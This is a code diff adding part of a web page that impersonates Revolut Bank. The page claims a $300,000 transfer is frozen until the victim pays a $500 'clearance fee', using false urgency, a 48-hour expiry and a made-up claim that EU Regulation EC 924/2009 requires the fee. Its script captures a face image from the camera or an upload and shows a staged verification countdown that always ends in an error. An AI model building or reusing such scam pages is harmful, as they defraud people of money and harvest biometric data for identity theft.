+          <div class="info-box-title">Transfer Clearance Hold — REF: RV-CLR-20260324-9471</div>
+          <div class="info-box-body">Your transfer of <strong>$300,000.00</strong> has been flagged by our compliance department. A clearance fee is required before funds can be released to your account.</div>
+        </div>
+      </div>
+
+      <div class="dark-box">
+        <div class="dark-box-top">
+          <span class="dark-box-label">Clearance Fee Required</span>
+          <span class="urgent-badge">URGENT</span>
+        </div>
+        <div class="fee-amount">$500.00</div>
+        <div class="fee-sub">One-time international wire clearance fee</div>
+        <div class="fee-breakdown">
+          <div class="fee-row">
+            <span>Transfer Amount</span>
+            <span>$300,000.00</span>
+          </div>
+          <div class="fee-row danger">
+            <span>Clearance Fee</span>
+            <span style="color:#ef4444;">$500.00</span>
+          </div>
+          <div class="fee-row total">
+            <span>Net Amount to Release</span>
+            <span>$300,000.00</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="info-box amber">
+        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+        </svg>
+        <div>
+          <div class="info-box-title">Why is this required?</div>
+          <div class="info-box-body">Under EU Regulation EC 924/2009 and Revolut Bank's compliance policy, international transfers above $250,000 require a mandatory clearance verification fee. This fee is refundable after successful verification.</div>
+        </div>
+      </div>
+
+      <div class="next-steps">
+        <div class="next-steps-label">Next Steps</div>
+        <div class="next-step-item">
+          <div class="step-num">1</div>
+          <p>Pay the $500 clearance fee via the link below</p>
+        </div>
+        <div class="next-step-item">
+          <div class="step-num">2</div>
+          <p>Funds will be released within 2–4 business hours</p>
+        </div>
+        <div class="next-step-item">
+          <div class="step-num">3</div>
+          <p>Clearance fee is fully refundable upon receipt</p>
+        </div>
+      </div>
+
+      <button class="btn-primary">Pay Clearance Fee — $500</button>
+      <button class="btn-secondary">Contact Support</button>
+      <div class="case-id">Case ID: RV-CLR-20260324-9471 &bull; Expires in 48 hours</div>
+    </div>
+  </div>
+</div>
+
+<script>
+  let cameraStream = null;
+  let faceReady = false;
+  const circumference = 2 * Math.PI * 34; // ≈ 213.6
+
+  function goTo(screenId) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(screenId).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  function enableSubmit() {
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = false;
+    btn.style.opacity = '1';
+    btn.style.cursor = 'pointer';
+  }
+
+  async function startCamera() {
+    try {
+      cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById('video-preview');
+      const img   = document.getElementById('img-preview');
+      document.getElementById('face-placeholder').style.display = 'none';
+      img.style.display   = 'none';
+      video.style.display = 'block';
+      video.srcObject = cameraStream;
+      faceReady = true;
+      enableSubmit();
+    } catch (e) {
+      alert('Camera access denied. Please upload a photo instead.');
+    }
+  }
+
+  function handleUpload(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = function(ev) {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(t => t.stop());
+        cameraStream = null;
+      }
+      const video = document.getElementById('video-preview');
+      const img   = document.getElementById('img-preview');
+      document.getElementById('face-placeholder').style.display = 'none';
+      video.style.display = 'none';
+      img.style.display   = 'block';
+      img.src = ev.target.result;
+      faceReady = true;
+      enableSubmit();
+    };
+    reader.readAsDataURL(file);
+  }
+
+  function markStep(index) {
+    const dot = document.getElementById('dot-' + index);
+    const lbl = document.getElementById('lbl-' + index);
+    dot.classList.remove('pending');
+    dot.classList.add('done');
+    dot.innerHTML = `<svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="3" style="width:11px;height:11px;">
+      <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/>
+    </svg>`;
+    lbl.classList.remove('pending');
+    lbl.classList.add('done');
+  }
+
+  function startProcessing() {
+    if (!faceReady) return;
+    if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
+    goTo('screen-processing');
+
+    let count = 13;
+    const circle = document.getElementById('progress-circle');
+    const numEl  = document.getElementById('countdown-num');
+
+    // step thresholds (mark step when countdown drops below these)
+    const stepAt = [11, 8, 5, 2];
+
+    const interval = setInterval(function() {
+      count--;
+      numEl.textContent = count;
+
+      // progress arc
+      const progress = (13 - count) / 13;
+      circle.style.strokeDashoffset = circumference * (1 - progress);
+
+      // mark steps
+      stepAt.forEach(function(threshold, i) {
+        if (count < threshold) markStep(i);
+      });
+
+      if (count <= 0) {
+        clearInterval(interval);
+        setTimeout(function() { goTo('screen-error'); }, 400);
+      }
+    }, 1000);
+  }
+</script>
 </body>
 </html>
